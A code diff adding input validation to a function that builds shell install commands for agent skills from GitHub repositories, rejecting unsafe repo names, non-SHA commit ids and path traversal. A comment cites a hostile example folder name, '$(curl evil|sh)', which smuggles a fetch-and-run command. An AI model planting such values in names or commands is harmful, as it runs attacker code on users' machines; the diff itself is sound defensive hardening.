@@ -18,8 +18,17 @@ export const AGENT_DOCS = {
   windsurf: { label: 'Windsurf', dir: null, npx: 'windsurf', gh: null },
 };
 
+// Repo names and skill paths come from other people's repos and end up in shell commands that visitors
+// copy and run, so only plain characters are allowed: a folder named $(curl evil|sh) must never get a command.
+const SAFE = /^[A-Za-z0-9._-]+$/;
+const safePath = (p) => p.split('/').every((seg) => SAFE.test(seg) && seg !== '..');
+
 // skill: { name, path } where path is the SKILL.md path in the repo. sha pins the commit.
+// Throws when any name or path has characters outside the safe set; the caller then shows no commands.
 export function buildInstall({ full_name, sha, skills }) {
+  if (!/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(full_name)) throw new Error(`unsafe repo name ${JSON.stringify(full_name)}`);
+  if (!/^[0-9a-f]{40}$/.test(sha)) throw new Error('commit id is not a full sha');
+  if (!skills.length || !SAFE.test(skills[0].name) || !safePath(skills[0].path)) throw new Error('skill folder name has characters that are unsafe in a shell command');
   const url = `https://github.com/${full_name}.git`;
   const repo = full_name.split('/')[1];
   const first = skills[0];
